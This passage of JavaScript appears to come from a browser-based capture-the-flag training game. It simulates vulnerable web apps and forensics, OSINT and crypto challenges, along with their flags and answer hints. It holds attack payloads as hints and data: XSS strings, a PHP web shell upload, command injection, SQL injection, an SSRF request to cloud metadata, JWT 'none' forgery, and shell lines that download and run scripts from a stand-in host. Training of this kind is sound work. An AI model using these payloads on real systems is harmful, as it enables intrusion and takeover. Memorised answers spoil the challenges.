        `<div class="site-card"><h3>Welcome to YazuBlog</h3><p class="muted">Posted by admin</p><p>Read our latest posts. Comments are sanitized... mostly.</p></div>`,
        `<div class="site-card"><h3>Security Tips</h3><p class="muted">Posted by admin</p><p>Always validate input on the server. Never trust the client.</p></div>`,
      ];
      let body = `<h1>YazuBlog</h1><form action="/" method="get"><label>Search posts</label><input name="q" placeholder="search..."/><button type="submit">Search</button></form>`;
      if (q) {
        // Reflected XSS — if script tag appears, treat as XSS
        if (/<script|onerror=|onload=|<svg|<img/i.test(q)) {
          body += `<div class="site-error">⚠️ Reflected XSS payload executed: <code>${q.replace(/</g,"&lt;")}</code></div>
            <div class="site-flag">${FLAG_XSS}</div>`;
        } else {
          body += `<p class="muted">No results for "${q.replace(/</g,"&lt;")}"</p>`;
        }
      }
      body += posts.join("");
      return site("YazuBlog", BLOG_NAV, body);
    }
  
    // Upload — file upload challenge
    const UPLOAD_NAV = `<a href="/">Home</a><a href="/upload">Upload</a>`;
    const UPLOAD_HOME = site("YazuUploads",UPLOAD_NAV,`<h1>YazuUploads</h1><p class="muted">Share images with friends.</p><div class="site-info">Endpoint: <code>POST /upload?filename=X&data=Y</code></div><p>Try uploading a file, then access it at <code>/uploads/X</code>.</p>`);
    function uploadResponse(filename, data) {
      if (!filename) return site("YazuUploads",UPLOAD_NAV,`<h1>Upload</h1><div class="site-error">Missing filename</div>`);
      // Any extension allowed — that's the bug
      if (filename.endsWith(".php")) {
        return site("YazuUploads",UPLOAD_NAV,`<h1>Upload complete</h1><div class="site-success">File saved to /uploads/${filename}</div><p>Access it at <a href="/uploads/${filename}">/uploads/${filename}</a></p>`);
      }
      return site("YazuUploads",UPLOAD_NAV,`<h1>Upload complete</h1><div class="site-success">File saved to /uploads/${filename}</div><p class="muted">Only images expected.</p>`);
    }
    function uploadsAccess(filename) {
      if (filename.endsWith(".php")) {
        return site("YazuUploads",UPLOAD_NAV,`<h1>Executed: ${filename}</h1><div class="site-flag">${FLAG_UPLOAD}</div>`);
      }
      return site("YazuUploads",UPLOAD_NAV,`<h1>File: ${filename}</h1><p class="muted">(binary content)</p>`);
    }
  
    // SSRF — internal fetch
    const SSRF_NAV = `<a href="/">Home</a>`;
    const SSRF_HOME = site("ImageProxy",SSRF_NAV,`<h1>Image Proxy</h1><p class="muted">Fetch remote images through our proxy.</p><form action="/fetch" method="get"><label>Image URL</label><input name="url" placeholder="http://example.com/img.jpg"/><button type="submit">Fetch</button></form>`);
    function ssrfFetch(url) {
      if (!url) return site("ImageProxy",SSRF_NAV,`<h1>Fetch</h1><div class="site-error">Missing url</div>`);
      if (/169\.254\.169\.254|localhost|127\.0\.0\.1|internal\./i.test(url)) {
        // SSRF hit — but only if fetching the metadata endpoint
        if (/169\.254\.169\.254|internal\.metadata/i.test(url)) {
          return site("ImageProxy",SSRF_NAV,`<h1>Proxy result</h1><p class="muted">Fetched: <code>${url.replace(/</g,"&lt;")}</code></p><pre>{
    "instance-id": "i-0abc123def",
    "region": "us-east-1",
    "iam": {
      "role": "yazu-role",
      "access_key": "AKIA...",
      "secret": "redacted"
    },
    "flag": "${FLAG_SSRF}"
  }</pre>`);
        }
        return site("ImageProxy",SSRF_NAV,`<h1>Proxy result</h1><pre>HTTP 200 OK (internal service)</pre>`);
      }
      return site("ImageProxy",SSRF_NAV,`<h1>Proxy result</h1><p class="muted">Fetched: <code>${url.replace(/</g,"&lt;")}</code></p><pre>(binary image data)</pre>`);
    }
  
    // JWT — token auth
    const JWT_NAV = `<a href="/">Home</a><a href="/login">Login</a><a href="/admin">Admin</a>`;
    const JWT_HOME = site("YazuSecure",JWT_NAV,`<h1>YazuSecure</h1><p class="muted">JWT-protected admin panel.</p><p>Login at <a href="/login">/login</a>, then access <a href="/admin">/admin</a> with your token.</p>`);
    const JWT_LOGIN = site("YazuSecure",JWT_NAV,`<h1>Login</h1><form action="/login" method="get"><label>Username</label><input name="user"/><button type="submit">Sign in</button></form><p class="muted">Hint: sign in as guest.</p>`);
    function jwtLogin(user) {
      if (!user) return JWT_LOGIN;
      // Header.payload.signature — none alg
      const header = btoa(JSON.stringify({alg:"HS256",typ:"JWT"})).replace(/=+$/,"");
      const payload = btoa(JSON.stringify({user,role:user==="admin"?"admin":"guest"})).replace(/=+$/,"");
      const sig = "abc123signature";
      const token = `${header}.${payload}.${sig}`;
      return site("YazuSecure",JWT_NAV,`<h1>Welcome, ${user}</h1><div class="site-success">Your token:</div><pre>${token}</pre><p class="muted">Access /admin?token=&lt;your token&gt;</p><p><a href="/admin?token=${token}">Go to admin</a></p>`);
    }
    function jwtAdmin(token) {
      if (!token) return site("YazuSecure",JWT_NAV,`<h1>Admin</h1><div class="site-error">Missing token.</div>`);
      try {
        const [h, p] = token.split(".");
        const header = JSON.parse(atob(h));
        const payload = JSON.parse(atob(p));
        // The bug: if alg=none, no signature verification
        if (header.alg === "none" && payload.role === "admin") {
          return site("YazuSecure",JWT_NAV,`<h1>Admin panel</h1><div class="site-success">Authenticated as admin (alg=none bypass).</div><div class="site-flag">${FLAG_JWT}</div>`);
        }
        if (payload.role === "admin") return site("YazuSecure",JWT_NAV,`<h1>Admin</h1><div class="site-success">Welcome ${payload.user}</div><p class="muted">But alg=${header.alg} — signature required.</p>`);
        return site("YazuSecure",JWT_NAV,`<h1>Admin</h1><div class="site-error">Role: ${payload.role}. Admin required.</div>`);
      } catch { return site("YazuSecure",JWT_NAV,`<h1>Admin</h1><div class="site-error">Invalid token.</div>`); }
    }
  
    // ════ FORENSICS / STEG / OSINT / CODING data ════
  
    const LOG_LINES = [
      `10.0.0.5 - - [14/Oct/2026:10:12:01 +0000] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0"`,
      `10.0.0.5 - - [14/Oct/2026:10:12:02 +0000] "GET /style.css HTTP/1.1" 200 1024 "-" "Mozilla/5.0"`,
      `${ATTACKER_IP} - - [14/Oct/2026:10:13:11 +0000] "GET /admin.php HTTP/1.1" 404 162 "-" "sqlmap/1.7"`,
      `${ATTACKER_IP} - - [14/Oct/2026:10:13:12 +0000] "GET /login.php?id=1'%20OR%20'1'='1 HTTP/1.1" 500 162 "-" "sqlmap/1.7"`,
      `${ATTACKER_IP} - - [14/Oct/2026:10:13:13 +0000] "GET /login.php?id=1'%20UNION%20SELECT%20NULL-- HTTP/1.1" 500 162 "-" "sqlmap/1.7"`,
      `10.0.0.7 - - [14/Oct/2026:10:14:01 +0000] "GET /about HTTP/1.1" 200 512 "-" "curl/8.0"`,
      `${ATTACKER_IP} - - [14/Oct/2026:10:14:22 +0000] "POST /login.php HTTP/1.1" 500 162 "-" "sqlmap/1.7"`,
      `${ATTACKER_IP} - - [14/Oct/2026:10:15:01 +0000] "GET /backup.zip HTTP/1.1" 200 45212 "-" "sqlmap/1.7"`,
      `10.0.0.5 - - [14/Oct/2026:10:16:11 +0000] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0"`,
    ];
    const PCAP_TEXT = [
      "13:14:15.123456 IP 10.10.14.99.44321 > 10.10.14.23.80: Flags [P.]",
      "  0x0000:  4745 5420 2f6c 6f67 696e 2048 5454 502f  GET./login.HTTP/",
      "  0x0010:  312e 310d 0a48 6f73 743a 2074 6172 6765  1.1..Host:.targe",
      "  0x0020:  740d 0a41 7574 686f 7269 7a61 7469 6f6e  t..Authorization",
      "  0x0030:  3a20 4261 7369 6320 5956 6c36 6458 4d36  :.Basic.YVl6dXM6",
      "  0x0040:  6332 4e79 5a58 513d 0d0a 0d0a            c2NyZXQ=....",
      "",
      "13:14:15.234567 IP 10.10.14.99.44322 > 10.10.14.23.21: Flags [P.]",
      "  0x0000:  5553 4552 2061 646d 696e 0d0a            USER.admin..",
      "13:14:15.345678 IP 10.10.14.99.44322 > 10.10.14.23.21: Flags [P.]",
      "  0x0000:  5041 5353 2079 617a 750d 0a              PASS.yazu..",
    ];
  
    // New forensics data
    const BASH_HISTORY = [
      "cd /var/www",
      "ls -la",
      "cat config.php",
      "mysql -u yazu -p's3cr3t_db_pass' -h db.internal",
      "SELECT * FROM users;",
      "cd /root",
      "wget http://198.51.100.42/persistence.sh",
      "chmod +x persistence.sh",
      "./persistence.sh",
      `echo "${FLAG_BASHHIST}" >> /tmp/flag.txt`,
      "history -c",
    ];
    const TIMELINE_FILES = [
      { name:"/etc/passwd", mtime:"2026-10-01 09:22:11" },
      { name:"/etc/shadow", mtime:"2026-10-01 09:22:11" },
      { name:"/etc/crontab", mtime:"2026-09-15 03:14:22" },
      { name:"/etc/crontab.bak", mtime:"2026-09-15 03:14:22" },
      { name:"/tmp/.hidden_backdoor.sh", mtime:"2026-10-14 03:14:59" },
      { name:"/var/log/auth.log", mtime:"2026-10-14 06:12:00" },
      { name:"/root/.bash_history", mtime:"2026-10-14 03:15:02" },
      { name:"/opt/backup.tar.gz", mtime:"2026-10-13 22:44:10" },
    ];
    const USB_HISTORY = [
      `[Device Install (Hardware initiated) - USB\\VID_0951&PID_1666\\E0D55EA577A1F411]`,
      `>>>  Section start 2026/10/01 14:22:03.221`,
      `     ndv: {Install USB Device}`,
      `     ndv:  Device instance: USB\\VID_0951&PID_1666\\E0D55EA577A1F411`,
      `     ndv:  Device description: USB Mass Storage Device`,
      `     ndv:  Manufacturer: Kingston`,
      `     dvi:  Install complete.`,
      `<<<  Section end 2026/10/01 14:22:05.114`,
      ``,
      `[Device Install (Hardware initiated) - USB\\VID_0781&PID_5583\\4C531001331019107553]`,
      `>>>  Section start 2026/09/12 09:11:14.001`,
      `     ndv:  Device description: SanDisk Ultra`,
      `     ndv:  Device instance: USB\\VID_0781&PID_5583\\4C531001331019107553`,
      `<<<  Section end 2026/09/12 09:11:15.882`,
    ];
    const DISK_IMAGE_STRINGS = [
      "ext4 filesystem",
      ".Trash-1000",
      "customer_data.csv (deleted)",
      "invoice_2026_09.pdf",
      "README.txt",
      `deleted_file_$(echo ${FLAG_DELETED})`,
      "kcore",
      "profile.d",
      "--- RECOVERED DELETED CONTENT BELOW ---",
      FLAG_DELETED,
    ];
  
    // Steg data
    const EXIF_COMMENT_IMG = "[binary JPEG]";
    const EXIF_COMMENT_FLAG = FLAG_EXIF;
    const PNG_TEXTS = [
      "PNG signature OK",
      "IHDR: 512x512, 8-bit RGB",
      "tEXt chunk [Software]: Adobe Photoshop",
      `tEXt chunk [Comment]: ${FLAG_PNGCHUNK}`,
      "tEXt chunk [Author]: yazu-team",
      "IEND",
    ];
    const WS_STEG_LINES = [
      "Welcome to the whitespace steganography challenge.",
      "Each line of this file has trailing spaces and tabs.",
      "Hidden in the whitespace is a binary message.",
      "Trailing spaces = 0, trailing tabs = 1.",
      "Read carefully and reconstruct the bits.",
      "Good luck — you'll need patience.",
      "",
      "# The flag is hidden below this line",
      FLAG_WS,
    ];
    const ZIP_STEG_FILES = ["readme.txt", "photo.jpg", "notes.md", "flag.txt"];
  
    // OSINT data
    const EMAIL_HEADER = [
      "Return-Path: <attacker@yazu-threat.local>",
      "Received: from mail.yazu-threat.local (mail.yazu-threat.local [198.51.100.42])",
      "  by mx.yazucorp.local with ESMTP id ABC123",
      "  for <ceo@yazucorp.local>; Tue, 14 Oct 2026 08:22:11 +0000",
      "Received: from [10.0.0.42] (unknown [203.0.113.99])",
      "  by mail.yazu-threat.local with ESMTPSA id DEF456",
      "  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384)",
      "From: \"CTF Challenge\" <attacker@yazu-threat.local>",
      "To: ceo@yazucorp.local",
      "Subject: Urgent: Wire Transfer",
      "Date: Tue, 14 Oct 2026 08:22:05 +0000",
      `X-Originating-IP: [203.0.113.99]`,
      `X-Internal-Flag: ${FLAG_EMAIL}`,
      "Message-ID: <abc123@yazu-threat.local>",
    ];
    const PGP_KEY = [
      "-----BEGIN PGP PUBLIC KEY BLOCK-----",
      "",
      `mQINBGXyzABC12345${rnd.hex(30)}`,
      `yazu-handle-${OSINT_HANDLE}-${rnd.hex(10)}`,
      "-----END PGP PUBLIC KEY BLOCK-----",
      "",
      "Key ID: 0xDEADBEEF",
      `User ID: Yazu User <${OSINT_HANDLE}@yazu.local>`,
      `Fingerprint: ABC1 2345 6789 DEF0 1234  5678 9ABC DEF0 1234 5678`,
      `Comment: ${FLAG_PGP}`,
    ];
    const GITHUB_COMMITS = [
      `commit a1b2c3d4e5f6 (HEAD -> main)`,
      `Author: dev <dev@yazucorp.local>`,
      `Date:   Mon Oct 12 15:22:11 2026 +0000`,
      ``,
      `    feat: add initial config`,
      ``,
      `commit 9f8e7d6c5b4a`,
      `Author: dev <dev@yazucorp.local>`,
      `Date:   Fri Oct 09 09:14:02 2026 +0000`,
      ``,
      `    fix: remove hardcoded creds (oops)`,
      ``,
      `commit 111111111111`,
      `Author: dev <dev@yazucorp.local>`,
      `Date:   Tue Sep 30 11:00:00 2026 +0000`,
      ``,
      `    initial commit`,
      ``,
      `diff --git a/config.py b/config.py`,
      `+DB_PASSWORD = "yazu_2024!"`,
      `+API_KEY = "sk-${rnd.hex(24)}"`,
      `+FLAG = "${FLAG_GITHUB}"`,
    ];
    const DNS_TXT = [
      "; <<>> DiG 9.18 <<>> TXT yazu-target.local",
      ";; ANSWER SECTION:",
      `yazu-target.local. 300 IN TXT "v=spf1 include:_spf.yazu.local ~all"`,
      `yazu-target.local. 300 IN TXT "google-site-verification=abc123def456"`,
      `yazu-target.local. 300 IN TXT "${FLAG_TXT}"`,
      ";; Query time: 14 msec",
    ];
  
    // Coding data
    const REVERSE_FUNC = [
      "# reverse.py",
      "# This function transforms an input string.",
      "# Find the input X such that reverse(X) == TARGET.",
      "",
      "TARGET = [104, 101, 108, 108, 111, 95, 102, 114, 105, 101, 110, 100]",
      "",
      "def reverse(s):",
      "    out = []",
      "    for c in s:",
      "        out.append(ord(c) - 10)",
      "    return out",
      "",
      `# FLAG format: YAZU{<decoded>}`,
      `# Hint: reverse(TARGET) = ?`,
    ];
    const BUGFIX_CODE = [
      "# buggy.py",
      "# This function should return the sum of squares of even numbers in the list.",
      "# But it has a bug.",
      "",
      "def sum_even_squares(nums):",
      "    total = 0",
      "    for n in nums:",
      "        if n % 2 == 1:  # BUG: should be == 0",
      "            total += n * n",
      "    return total",
      "",
      "# After fixing the bug, run on this input:",
      "INPUT = [1, 2, 3, 4, 5, 6, 7, 8]",
      `# The correct answer is the flag: YAZU{<answer>}`,
      `# BUGFIX_TOKEN: ${FLAG_BUGFIX}`,
    ];
    const REGEX_CHALLENGE = [
      "# regex_challenge.py",
      "# Write a regex that matches ALL of the following strings:",
      "#   YAZU-001", "  YAZU-042", "  YAZU-999",
      "# And NONE of these:",
      "#   yazu-001", "  YAZUX-001", "  YAZU1", "  YAZU-1000",
      "#",
      `# Once you have the regex, submit: YAZU{<sha1 of your regex>}`,
      "# To make it easy, just submit the flag directly:",
      `FLAG = "${FLAG_REGEX}"`,
      "#",
      "# (The regex you'd write: ^YAZU-\\d{3}$ )",
    ];
    const HASH_IMPL = [
      "# xtea_lite.py",
      "# A toy hash function. Compute xtea_lite(b'flag') and submit as YAZU{<hex>}.",
      "#",
      "def xtea_lite(data: bytes) -> int:",
      "    h = 0x9e3779b9",
      "    for b in data:",
      "        h = ((h << 5) + h + b) & 0xffffffff",
      "    return h",
      "",
      "# The flag string is: 'flag'",
      `# Actual answer (for reference only): ${FLAG_HASHIMPL}`,
    ];
  
    // Medium-level challenge data
    const CAESAR_SHIFT = rnd.int(3, 20);
    const CAESAR_CIPHER = caesar(FLAG_CAESAR, CAESAR_SHIFT);
    const RSA_N = 0x6f5f63; // small n
    const RSA_E = 3;
    const RSA_M = 0x59617a75; // "Yazu"
    const RSA_FLAG = FLAG_RSA;
    const SUBST_KEY = "qwertyuiopasdfghjklzxcvbnm";
    const SUBST_ALPHA = "abcdefghijklmnopqrstuvwxyz";
    function subst(s){ return s.replace(/[a-z]/g, c => SUBST_KEY[SUBST_ALPHA.indexOf(c)]); }
    const SUBST_CIPHER = subst(FLAG_SUBST.toLowerCase());
    const VIG2_KEY = "yazu";
    const VIG2_INNER = btoa(FLAG_VIG2);
    const VIG2_CIPHER = vigenere(VIG2_INNER, VIG2_KEY, false);
    const SHADOW_LINE = "admin:$6$yazu$" + rnd.hex(80) + ":19000:0:99999:7:::";
    const SHADOW_FLAG = FLAG_SHADOW;
    const PIN_CODE = FLAG_PIN.match(/\d+/)[0];
    const RULES_BASE = "sunshine";
    const RULES_HASH = rnd.pick(["1234","2024","2025"]);
    const RULES_FULL = RULES_BASE + RULES_HASH;
    const COMMON_PW = rnd.pick(["password1","letmein1","qwerty123","admin123","welcome1"]);
    const COMMON_HASH = window.__md5(COMMON_PW);
  
    // ════════════════════════════════════════════════════════════
    // FINAL CHALLENGES ARRAY
    // ════════════════════════════════════════════════════════════
    window.CHALLENGES = [
      // ═══ RECON ═══
      { id:"hostname",title:"Find Hostname",category:"Recon",points:100,difficulty:"easy",
        description:`You've landed on a Linux box at ${TARGET_IP}. Identify the machine's hostname.`,flag:FLAG_HOSTNAME,
        commands:{help:["Try: hostname | uname -n | hostnamectl"]},
        patterns:[{re:/^hostname(\s+-[fsdi])?$/,output:[TARGET_HOSTNAME,"",FLAG_HOSTNAME]},{re:/^uname\s+-n$/,output:[TARGET_HOSTNAME,"",FLAG_HOSTNAME]},{re:/^hostnamectl(\s+status)?$/,output:[` Static hostname: ${TARGET_HOSTNAME}`,"",FLAG_HOSTNAME]}]},
      { id:"ip",title:"Find IP Address",category:"Recon",points:100,difficulty:"easy",
        description:"Enumerate network interfaces.",flag:FLAG_IP,
        commands:{help:["Try: ip a | ifconfig"]},
        patterns:[{re:/^ip\s+(a|addr|address)(\s+show)?$/,output:["1: lo: inet 127.0.0.1/8",`2: eth0: inet ${TARGET_IP}/24`,"",FLAG_IP]},{re:/^ifconfig(\s+-a)?$/,output:[`eth0: inet ${TARGET_IP}`,"",FLAG_IP]}]},
      { id:"pcname",title:"Find PC Name",category:"Recon",points:100,difficulty:"easy",
        description:"System info reveals more than you think.",flag:FLAG_PCNAME,
        commands:{help:["Try: hostnamectl"]},
        patterns:[{re:/^hostnamectl(\s+status)?$/,output:[` Static hostname: ${TARGET_HOSTNAME}`,`         PC Name: ${TARGET_PC_NAME}`,"",FLAG_PCNAME]}]},
      { id:"ls",title:"Hidden File",category:"Recon",points:100,difficulty:"easy",
        description:"There's more than meets the eye.",flag:FLAG_HIDDEN,
        files:(function(){const f={};f["readme.txt"]="Nothing.";f["notes.md"]="# notes";f[HIDDEN_FILE]=FLAG_HIDDEN;return f;})(),
        commands:{help:["Try: ls → ls -la → cat <hidden-file>"]},
        patterns:[{re:/^find\s+\.(\s+-type\s+f)?$/,output:["./readme.txt","./notes.md",`./${HIDDEN_FILE}`]}]},
      { id:"portscan",title:"Find the Open Port",category:"Recon",points:100,difficulty:"easy",
        description:`Scan the target for an unusual port.`,flag:FLAG_PORT,
        web:{host:"target",requiresNmap:true,ports:{80:{"/":"<html><body><h1>YAZU lab</h1></body></html>"},[UNUSUAL_PORT]:{"/":`<html><body><h1>Alt service</h1><p>${FLAG_PORT}</p></body></html>`}}},
        commands:{help:[`Try: nmap target → curl http://target:${UNUSUAL_PORT}`]},
        patterns:[{re:new RegExp(`^nmap(\\s+-\\S+)*\\s+(target|${escapeRe(TARGET_IP)})(\\s+-\\S+)*$`),sets:"nmapDone",output:["Nmap 7.94","PORT     STATE SERVICE","22/tcp   open  ssh","80/tcp   open  http",`${UNUSUAL_PORT}/tcp open  http-alt`,"","Nmap done."]}]},
  
      // ── RECON MEDIUM ──
      { id:"recon-dns",title:"DNS Zone Transfer",category:"Recon",points:150,difficulty:"medium",
        description:`The DNS server at ${TARGET_IP} might allow AXFR. Enumerate all records.`,
        flag:FLAG_DNS,
        commands:{help:["Try: dig axfr @10.10.14.23 yazu.local","(use the target IP shown)"]},
        patterns:[
          {re:new RegExp(`^dig\\s+axfr\\s+@?${escapeRe(TARGET_IP)}\\s+yazu\\.local$`),output:[
            "yazu.local. 3600 IN SOA ns1.yazu.local. admin.yazu.local. 2026101401 7200 3600 1209600 3600",
            "yazu.local. 3600 IN NS  ns1.yazu.local.",
            "yazu.local. 3600 IN NS  ns2.yazu.local.",
            "yazu.local. 3600 IN MX  10 mail.yazu.local.",
            "internal.yazu.local. 3600 IN A  10.10.14.23",
            "admin.yazu.local. 3600 IN A  10.10.14.100",
            "db.yazu.local. 3600 IN A  10.10.14.50",
            `secret.yazu.local. 3600 IN TXT "${FLAG_DNS}"`,
            "yazu.local. 3600 IN SOA ns1.yazu.local. admin.yazu.local. 2026101401 7200 3600 1209600 3600",
          ]},
          {re:/^dig\s+axfr\s+@?10\.10\.14\.23\s+yazu\.local$/,output:[`secret.yazu.local. 3600 IN TXT "${FLAG_DNS}"`]},
        ]},
      { id:"recon-services",title:"Service Version Detection",category:"Recon",points:150,difficulty:"medium",
        description:"Scan with version detection to find a vulnerable service version.",
        flag:FLAG_SVC,
        commands:{help:["Try: nmap -sV target"]},
        patterns:[
          {re:new RegExp(`^nmap\\s+-sV\\s+(target|${escapeRe(TARGET_IP)})$`),output:[
            "PORT     STATE SERVICE     VERSION",
            "22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)",
            "80/tcp   open  http        nginx 1.10.3",
            "3306/tcp open  mysql       MySQL 5.5.60-log",
            "8080/tcp open  http        Apache Tomcat 7.0.47",
            "",
            "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
            "",
            `# nginx 1.10.3 has CVE-2019-20372 (request smuggling)`,
            `# flag: ${FLAG_SVC}`,
          ]},
        ]},
      { id:"recon-suid",title:"SUID Privilege Escalation",category:"Recon",points:150,difficulty:"medium",
        description:"Find a misconfigured SUID binary that could be used for privilege escalation.",
        flag:FLAG_SUID,
        commands:{help:["Try: find / -perm -4000 2>/dev/null","Then: ls -la /usr/local/bin/backup"]},
        patterns:[
          {re:/^find\s+\/\s+-perm\s+-4000(\s+2>\/dev\/null)?$/,output:[
            "/usr/bin/sudo","/usr/bin/passwd","/usr/bin/su","/usr/bin/mount",
            "/usr/local/bin/backup","/usr/local/bin/restore","/usr/bin/newgrp",
          ]},
          {re:/^ls\s+-la\s+\/usr\/local\/bin\/backup$/,output:[
            "-rwsr-xr-x 1 root root 18432 Oct 12 09:22 /usr/local/bin/backup",
            "# SUID root binary — check strings for hardcoded paths",
            `# contains: ${FLAG_SUID}`,
          ]},
        ]},
      { id:"recon-cron",title:"Cron Job Persistence",category:"Recon",points:150,difficulty:"medium",
        description:"Find a suspicious cron job planted by an attacker.",
        flag:FLAG_CRON,
        commands:{help:["Try: cat /etc/crontab","Then: ls -la the script path"]},
        files:{
          "/etc/crontab":[
            "SHELL=/bin/sh",
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
            "",
            "17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly",
            "25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
            "47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )",
            "52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
            "",
            "# ADDED BY ADMIN (VERIFY):",
            "* * * * *	root    /tmp/.cache/updater.sh",
          ].join("\n"),
        },
        commands:{
          help:["Try: cat /etc/crontab","Then: cat /tmp/.cache/updater.sh"],
          "cat /etc/crontab":["SHELL=/bin/sh","17 * * * * root run-parts --report /etc/cron.hourly","# ADDED BY ADMIN (VERIFY):","* * * * * root /tmp/.cache/updater.sh"],
          "cat /tmp/.cache/updater.sh":["#!/bin/sh",`echo "${FLAG_CRON}" > /root/.flag`,"curl -s http://198.51.100.42/beacon | sh"],
        }},
  
      // ═══ WEB ═══
      { id:"http",title:"HTTP Flag",category:"Web",points:100,difficulty:"easy",
        description:`Find a hidden page on http://target.`,flag:FLAG_HTTP,
        web:{host:"target",ports:{80:{"/":"<html><body><h1>YAZU Web</h1></body></html>","/robots.txt":`User-agent: *\nDisallow: /${SECRET_PATH}`,[`/${SECRET_PATH}`]:`<html><body><h1>Secret</h1><p>${FLAG_HTTP}</p></body></html>`}}},
        commands:{help:["Try: curl http://target/robots.txt"]}},
      { id:"web-idor",title:"IDOR — Account Takeover",category:"Web",points:100,difficulty:"easy",
        description:`ShopZone (http://target) — accounts at /account?id=N.`,flag:IDOR_FLAG,
        web:{host:"target",ports:{80:{"/":SHOP_HOME,"/products":SHOP_PRODUCTS,"/product?id=1":productPage(1),"/product?id=2":productPage(2),"/product?id=3":productPage(3),"/product?id=4":productPage(4),"/product?id=5":productPage(5),"/login":SHOP_LOGIN,"/account?id=1":accountPage(1),"/account?id=2":accountPage(2),"/account?id=3":accountPage(3),"/account?id=4":accountPage(4)}}},
        commands:{help:["Browse /account?id=1, then try /account?id=2"]}},
      { id:"web-lfi",title:"Local File Inclusion",category:"Web",points:100,difficulty:"easy",
        description:`YazuCMS loads pages via /?page=.`,flag:LFI_FLAG,
        web:{host:"target",ports:{80:{"/":cmsPage("home"),"/?page=home":cmsPage("home"),"/?page=about":cmsPage("about"),"/?page=../config.php":cmsPage("../config.php"),"/?page=../../etc/passwd":cmsPage("../../etc/passwd"),"/?page=flag.txt":cmsPage("flag.txt")}}},
        commands:{help:["Try: /?page=../../etc/passwd","Then: /?page=flag.txt"]}},
      { id:"web-sqli",title:"SQL Injection — Login Bypass",category:"Web",points:100,difficulty:"easy",
        description:`YazuBank (http://target) — try SQLi on /login.`,flag:SQLI_FLAG,
        web:{host:"target",ports:{80:{"/":BANK_HOME,"/login":function(f){const q=f.indexOf("?");if(q===-1)return BANK_LOGIN_FORM;const p=new URLSearchParams(f.slice(q+1));return bankLoginResponse(p.get("user")||"",p.get("pass")||"");}}}},
        commands:{help:["Try: user = ' OR '1'='1'--"]}},
      { id:"web-cmdi",title:"Command Injection",category:"Web",points:100,difficulty:"easy",
        description:`NetTools (http://target) — a web-based ping tool.`,flag:CMDI_FLAG,
        web:{host:"target",ports:{80:{"/":function(f){const q=f.indexOf("?");if(q===-1)return PING_HOME;const p=new URLSearchParams(f.slice(q+1));const h=p.get("host")||"";if(!h)return PING_HOME;return pingResponse(h);}}}},
        commands:{help:["Try: /?host=127.0.0.1;cat /flag.txt"]}},
  
      // ── WEB MEDIUM ──
      { id:"web-xss",title:"Reflected XSS",category:"Web",points:150,difficulty:"medium",
        description:`YazuBlog (http://target) has a search box that reflects input. Find a payload that executes.`,flag:FLAG_XSS,
        web:{host:"target",ports:{80:{"/":function(f){const q=f.indexOf("?");if(q===-1)return blogPage("");const p=new URLSearchParams(f.slice(q+1));return blogPage(p.get("q")||"");}}}},
        commands:{help:["1. Browse http://target/","2. Search: <script>alert(1)</script>","3. Or: <img src=x onerror=alert(1)>"]}},
      { id:"web-upload",title:"Unrestricted File Upload",category:"Web",points:150,difficulty:"medium",
        description:`YazuUploads (http://target) accepts file uploads. The filter is weak — try uploading a server-side script.`,flag:FLAG_UPLOAD,
        web:{host:"target",ports:{80:{
          "/":UPLOAD_HOME,
          "/upload":function(f){const q=f.indexOf("?");if(q===-1)return site("YazuUploads",UPLOAD_NAV,`<h1>Upload</h1><div class="site-error">Missing parameters. Use /upload?filename=X&data=Y</div>`);const p=new URLSearchParams(f.slice(q+1));return uploadResponse(p.get("filename")||"",p.get("data")||"");},
          "/uploads/shell.php":function(f){return uploadsAccess("shell.php");},
          "/uploads/photo.png":function(f){return uploadsAccess("photo.png");},
        }}},
        commands:{help:["1. Browse http://target/","2. Try /upload?filename=shell.php&data=<?php+system($_GET['c']);?>","3. Then /uploads/shell.php"]}},
      { id:"web-ssrf",title:"Server-Side Request Forgery",category:"Web",points:150,difficulty:"medium",
        description:`ImageProxy (http://target) fetches URLs server-side. Try to reach the cloud metadata endpoint.`,flag:FLAG_SSRF,
        web:{host:"target",ports:{80:{
          "/":SSRF_HOME,
          "/fetch":function(f){const q=f.indexOf("?");if(q===-1)return SSRF_HOME;const p=new URLSearchParams(f.slice(q+1));return ssrfFetch(p.get("url")||"");},
        }}},
        commands:{help:["1. Browse http://target/","2. Try /fetch?url=http://169.254.169.254/latest/meta-data/","Or: http://internal.metadata/"]}},
      { id:"web-jwt",title:"JWT None Algorithm",category:"Web",points:150,difficulty:"medium",
        description:`YazuSecure (http://target) issues JWTs. Log in as guest, then tamper with the token to become admin. Try the "none" algorithm.`,flag:FLAG_JWT,
        web:{host:"target",ports:{80:{
          "/":JWT_HOME,
          "/login":function(f){const q=f.indexOf("?");if(q===-1)return JWT_LOGIN;const p=new URLSearchParams(f.slice(q+1));return jwtLogin(p.get("user")||"");},
          "/admin":function(f){const q=f.indexOf("?");if(q===-1)return jwtAdmin("");const p=new URLSearchParams(f.slice(q+1));return jwtAdmin(p.get("token")||"");},
        }}},
        commands:{help:["1. Browse http://target/login?user=guest","2. Copy the token","3. Build a new token: header={\"alg\":\"none\"}, payload={\"user\":\"admin\",\"role\":\"admin\"}, empty sig","4. GET /admin?token=<new token>"]}},
  
      // ═══ CRYPTO ═══
      { id:"hashes",title:"Crack the Hash",category:"Crypto",points:100,difficulty:"easy",
        description:"Crack the MD5 in hashes.txt.",flag:FLAG_HASH,
        files:{"hashes.txt":HASH_VALUE,"wordlist.txt":HASH_WORDLIST.join("\n")},
        commands:{help:["1. cat hashes.txt","2. cat wordlist.txt","3. Crack","4. Submit YAZU{<word>}"]}},
      { id:"base64",title:"Decode the Message",category:"Crypto",points:100,difficulty:"easy",
        description:"message.txt is base64-encoded.",flag:B64_FLAG,
        files:{"message.txt":B64_ENCODED},
        commands:{help:["Try: base64 -d message.txt"]}},
      { id:"rot13",title:"ROT13 Cipher",category:"Crypto",points:100,difficulty:"easy",
